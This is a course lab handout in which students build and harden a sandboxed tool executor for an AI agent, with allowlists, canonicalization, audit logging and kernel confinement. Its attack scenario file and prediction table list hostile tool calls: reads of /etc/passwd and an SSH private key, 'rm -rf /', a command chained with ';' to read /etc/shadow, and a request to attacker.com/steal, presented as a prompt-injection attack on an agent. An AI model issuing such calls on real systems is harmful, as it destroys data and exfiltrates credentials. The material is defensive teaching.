# Lab E: Build an Agent Sandbox

> **Estimated time:** 6–8 hours
>
> **Prerequisites:** Chapter 6 and Chapter 12 §12.1–12.8
> (Part A — the safety lens); Linux with cgroups v2, user
> namespaces, and `libseccomp` available
>
> **Tools used:** Python 3.10+, `subprocess`, `unshare`,
> `seccomp-tools`, cgroup v2 filesystem, `strace`, the reference
> skeleton in `code/ch12-agent-sandbox/`

## Objectives

- Build a tool-call executor that validates arguments and
  produces a structured audit log
- Demonstrate that a prompt-injection attack that worked against
  a naive executor is blocked by your sandbox
- (Optional) Add seccomp + namespace + cgroup confinement and
  measure per-call overhead

## Background

Four parts, progressing from pure user-space validation
(everyone builds) to kernel-level confinement (optional, for
graduate students). Starter code in `code/ch12-agent-sandbox/`
contains a skeleton `sandbox.py`, a `policy.yaml`, a simulated
agent that emits tool-call requests, and an attack scenario
file.

## Part A: Process Isolation for Tool Execution (Required)

**Goal:** Build the basic execution path — validate, fork, run,
capture, log.

### A.1 The executor function

In `sandbox.py`, implement:

```python
def run_tool(name, args):
    """
    1. Look up tool in the allowlist.
    2. Validate args against the declared schema.
    3. Canonicalize arguments.
    4. Spawn a child process to execute the tool.
    5. Capture stdout/stderr with a timeout.
    6. Return a structured result.
    """
```

The child process isolation in Part A is minimal — just
`subprocess.run(..., timeout=...)` with a restricted
environment. Part D will add kernel-level isolation.

### A.2 The tool interface

Support at least four tools: `read_file`, `list_dir`,
`run_shell` (limited command list), `http_get` (allowlisted
URLs).

### A.3 Verify

```bash
python3 sandbox.py run read_file '{"path": "/data/hello.txt"}'
python3 sandbox.py run list_dir  '{"path": "/data"}'
```

Both should succeed; unknown tools should be rejected.

### Part A Checklist

- [ ] `run_tool` implemented
- [ ] Four tools wired up
- [ ] Successful calls return structured results
- [ ] Unknown tool name is rejected

## Part B: Allowlist Validation (Required)

**Goal:** Add policy enforcement and canonicalization.

### B.1 Load policy from YAML

`policy.yaml` declares, for each tool:

- Argument names and types.
- Allowlist and denylist for each argument.
- Per-tool timeout.
- Maximum response size.

### B.2 Canonicalize paths and URLs

For every path argument: `os.path.realpath` first, then compare
to the allowlist. Reject `/data/../etc/passwd` after it
canonicalizes to `/etc/passwd`.

For URLs: `urllib.parse.urlparse`, check scheme is `https` (or
`http` if allowed), check host is in the allowlist.

### B.3 Reject out-of-band characters

For shell arguments, reject strings containing:

```text
;  |  &  $  `  newline  null byte  <  >
```

### B.4 Unit tests

Write tests that prove each validator rejects its attack class:

- Path traversal rejected after canonicalization.
- Symlink out of allowlist rejected (use `realpath` through
  symlinks).
- Denied host in URL rejected.
- Shell metacharacters rejected.

### Part B Checklist

- [ ] `policy.yaml` loaded
- [ ] Path canonicalization implemented
- [ ] URL validation implemented
- [ ] Shell metacharacter check implemented
- [ ] Unit tests passing

## Part C: Audit Logging + Attack Scenario (Required)

**Goal:** Structured logs per call and a demonstrated blocked
attack.

### C.1 Audit format

Every call appends a JSON line to `audit.jsonl`:

```json
{
  "ts": "2026-04-15T10:30:45.123456Z",
  "session_id": "sess_abc123",
  "request_id": "req_001",
  "tool": "read_file",
  "args_raw": {"path": "/data/../etc/passwd"},
  "args_canonical": {"path": "/etc/passwd"},
  "decision": "BLOCKED",
  "policy_rule": "read_file.denied_paths[0]",
  "outcome": null,
  "duration_ms": 0.4
}
```

Requirements:

- One JSON object per line; no pretty-printing.
- UTC timestamps in ISO 8601.
- `args_canonical` matches what the allowlist actually
  evaluated.
- Blocked calls are logged with the reason.

### C.2 Predict which layer blocks each attack

Before running the scenario, fill in this table from the
`attack_scenario.json` calls below. Use only your code, your
`policy.yaml`, and the chapter — do not run the sandbox yet.

| Attack call | Predicted decision | Predicted blocking layer |
|---|---|---|
| `read_file /etc/passwd` |   |   |
| `read_file .../.ssh/id_rsa` |   |   |
| `run_shell rm -rf /` |   |   |
| `run_shell "ls /data; cat /etc/shadow"` |   |   |
| `http_get http://attacker.com/...` |   |   |
| `http_get https://api.weather.com/...` |   |   |

For *decision*, predict ALLOWED or BLOCKED. For *blocking layer*,
pick exactly one of:

1. **Tool name allowlist** — the tool itself is rejected.
2. **Argument allowlist / denylist** — the tool is allowed but
   the specific argument value is not.
3. **Path or URL canonicalization** — the raw argument looks
   allowed but `realpath` / `urlparse` resolves it to something
   denied.
4. **Shell-metacharacter check** — the argument contains
   `;`, `|`, `&`, `$`, backtick, or a literal newline and is
   rejected before execution.
5. **(None — ALLOWED through to execution.)**

A prediction of "BLOCKED somewhere" is not a prediction. The
point is to know *which layer* you are relying on for each
attack. After you replay the scenario in §C.3, mark each row
confirmed / wrong-layer / wrong-decision, and explain any
wrong-layer rows in one sentence — those are the ones that
teach you something about defense in depth.

### C.3 Attack scenario

Use the provided `attack_scenario.json`:

```json
[
  {"tool": "read_file",  "args": {"path": "/etc/passwd"}},
  {"tool": "read_file",  "args": {"path": "/home/user/.ssh/id_rsa"}},
  {"tool": "run_shell",  "args": {"cmd": "rm -rf /"}},
  {"tool": "run_shell",  "args": {"cmd": "ls /data; cat /etc/shadow"}},
  {"tool": "http_get",   "args": {"url": "http://attacker.com/steal"}},
  {"tool": "http_get",   "args": {"url": "https://api.weather.com/v1/..."}}
]
```

Run through your sandbox; expected output:

```text
$ python3 sandbox.py replay attack_scenario.json
[BLOCKED] read_file {"path": "/etc/passwd"}     — denied by policy
[BLOCKED] read_file {"path": ".../id_rsa"}      — denied by policy
[BLOCKED] run_shell {"cmd": "rm -rf /"}         — command not in allowlist
[BLOCKED] run_shell {"cmd": "ls; cat"}          — shell metacharacter
[BLOCKED] http_get  {"url": "attacker.com"}     — host not in allowlist
[ALLOWED] http_get  {"url": "api.weather.com"}  — 200 OK
```

Five blocks, one allow. Each corresponds to an audit log entry.

### C.4 Write-up

One page explaining:

- Which attack each rejection stopped.
- What an attacker might try next, and which defense layer
  would catch it.
- A minimal whitelist change that would accidentally open one
  of these attacks, and why.

### Part C Checklist

- [ ] Layer-prediction table filled before replay
- [ ] `audit.jsonl` produced with one line per call
- [ ] Canonical args recorded
- [ ] Five attacks blocked; legitimate call allowed
- [ ] Write-up included

## Part D: seccomp + Namespaces + Cgroups (Optional, Advanced)

**Goal:** Add kernel-level confinement and measure overhead.

### D.1 Implement the hardened executor

Before `execve` in the child:

1. **Unshare namespaces.** Mount, PID, network, user.
2. **Minimum mount.** Only the paths the tool needs; for
   `read_file`, bind-mount the single file read-only.
3. **seccomp filter.** Install an allowlist of syscalls
   appropriate for the tool family. For `read_file`: `read`,
   `write` (stdout/stderr only), `open`, `openat`, `close`,
   `fstat`, `lseek`, `exit`, `exit_group`, `mmap`, `munmap`,
   `brk`, `mprotect`, `arch_prctl`, `set_tid_address`. Deny
   everything else.
4. **cgroup v2.** Create a cgroup with `memory.max=128Mi`,
   `cpu.max="50000 100000"` (half a CPU), `pids.max=16`. Add
   the child to it before `execve`.
5. **Drop privileges.** After setup, `setuid` to a low-privileged
   UID (mapped inside the user namespace).

Reference implementations in `code/ch12-agent-sandbox/`:
`sandbox_hardened.py` and `seccomp_profiles/`.

### D.2 Verify it works

```bash
# Memory cap kicks in
python3 sandbox_hardened.py run run_shell '{"cmd": "..."}'
# → tool OOM-killed if it exceeds 128 MiB

# Seccomp blocks disallowed syscall
python3 sandbox_hardened.py run read_file '{"path": "/data/hello.txt"}'
strace it → expected "Bad system call" on anything not in the allowlist
```

### D.3 Measure overhead

Compare Part A executor vs Part D executor on a trivial
operation (`read_file` on a small file). Run 1 000 invocations
each and record:

| Phase | Part A (ms) | Part D (ms) | Δ |
|---|---|---|---|
| p50 per call |   |   |   |
| p99 per call |   |   |   |
| Total wall time |   |   |   |
| Total CPU time (user + sys) |   |   |   |

Expect Part D to add 1–5 ms per call. Discuss in the report:

- Where does the cost go? (`fork`, unshare, seccomp compile,
  cgroup attach, execve.)
- For which tools is the overhead negligible? (Anything doing
  real I/O — HTTP, DB, large files.)
- For which tools is the overhead painful? (High-rate
  introspection tools.)
- What would a pre-forked worker pool change?

### D.4 Tool-specific confinement matrix

Fill a table describing the minimum confinement each tool
should have:

| Tool | Mount namespace | PID ns | Net ns | seccomp profile | cgroup limits |
|---|---|---|---|---|---|
| `read_file` | read-only minimal | yes | yes (no net) | `fs_read` | 128 Mi / 0.5 CPU |
| `list_dir` | read-only minimal | yes | yes | `fs_read` | 128 Mi / 0.25 CPU |
| `run_shell` | tool-specific | yes | no (needs net?) | `shell_minimal` | 512 Mi / 1 CPU |
| `http_get` | minimal | yes | **no** (need DNS + TCP) | `net_client` | 128 Mi / 0.5 CPU |

### Part D Checklist

- [ ] Hardened executor implemented
- [ ] seccomp filter installed per tool
- [ ] cgroup limits enforced
- [ ] Overhead measured with 1 000 invocations
- [ ] Confinement matrix filled and justified

## Deliverables

Submit a directory:

```text
lab12/
├── sandbox.py                (Parts A–C)
├── sandbox_hardened.py       (Part D, optional)
├── policy.yaml
├── attack_scenario.json
├── tests/                    (Part B unit tests)
├── audit.jsonl               (sample output)
├── results/
│   └── overhead.csv          (Part D, optional)
└── lab12_report.md
```

`report.md` must include:

- Part A summary.
- Part B validator design and canonicalization strategy.
- Part C attack transcript with audit-log excerpts proving each
  block.
- (Optional) Part D overhead table and confinement matrix.
- 1–2 pages on defense layers and which attack each layer
  stops.

## AI Use and Evidence Trail

This lab is graded on **prediction → evidence → mechanism**, not
on polish. AI tools are allowed within
[Appendix D](../../appendices/appendix-d-ai-policy.md) (Regime 1):
they may help debug, recall flags, or polish prose; they may
**not** generate the prediction, fabricate raw data, or substitute
for your own mechanism-level explanation. Substantial use must be
disclosed in the Evidence Trail — honest disclosure is not
penalized; non-disclosure of substantial use is.

Append the following section to your report (full template and
examples in Appendix D §"The Evidence Trail"):

```markdown
## Evidence Trail

### Environment and Reproduction
- Commands used: see the Procedure sections above
- Raw output files: list paths in your submission

### AI Tool Use
- **Tool(s) used:** [tool name and version, or "None"]
- **What the tool suggested:** [one-sentence summary, or "N/A"]
- **What I independently verified:** [what you re-checked against
  your own data]
- **What I changed or rejected:** [if a suggestion was wrong or
  inapplicable]

### Failures and Iterations
- [At least one thing that did not work on the first attempt and
  what you learned from it.]
```

## Grading Rubric

| Criterion | Points |
|---|---|
| Part A: run_tool works; tools wire up | 20 |
| Part B: policy validation with canonicalization; unit tests | 25 |
| Part C: attack scenario blocked; audit log structured | 30 |
| Report: defense layers vs attack classes | 25 |
| **Optional** Part D: hardened executor + measurement | +15 bonus |

**Total: 100 (+15 bonus).**

## Evidence Contract

Security claims need evidence too. For each blocked attack,
show:

1. **The attempted call** (from `attack_scenario.json`).
2. **The rejection reason** emitted by the validator.
3. **The audit log entry** confirming the rejection was
   recorded.

If any of those three is missing for a claim, the claim is a
hope, not a proof.

## Common Pitfalls

- **Allowlisting before canonicalization.** A glob on `/data/*`
  accepts `/data/../etc/passwd`. Canonicalize first.
- **Forgetting symlink resolution.** `realpath` follows
  symlinks; if you use `abspath` you miss them. Use `realpath`.
- **Trusting `shlex.quote` for shell defense.** Quoting does
  not help if the tool runs `sh -c "$cmd"`. The right move is
  `subprocess.run(list_of_args, shell=False)`.
- **Logging pretty-printed JSON.** Multi-line logs are harder
  to parse and search. One line per record.
- **Running the audit log through the sandbox.** If the sandbox
  is compromised, the attacker will edit its own logs. Write
  logs to a separate process / append-only file / external
  collector.

## Troubleshooting

- **"Operation not permitted" on unshare.** Modern Ubuntu may
  need `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`
  (see Lab 5).
- **Seccomp filter accidentally blocks Python startup.**
  Install the filter *after* Python is done importing — use
  `execve` to hand off to a minimal helper binary, or use
  `prctl(SECCOMP_SET_MODE_FILTER, ..., SECCOMP_FILTER_FLAG_TSYNC)`
  carefully.
- **cgroup writes fail.** Check you are on cgroup v2; verify
  `mount | grep cgroup2`.

## Reference

- `man 2 seccomp`, `man 2 prctl`, `man 7 namespaces`, `man 7
  cgroups`.
- Python `subprocess` docs:
  <https://docs.python.org/3/library/subprocess.html>
- libseccomp Python bindings:
  <https://github.com/seccomp/libseccomp>
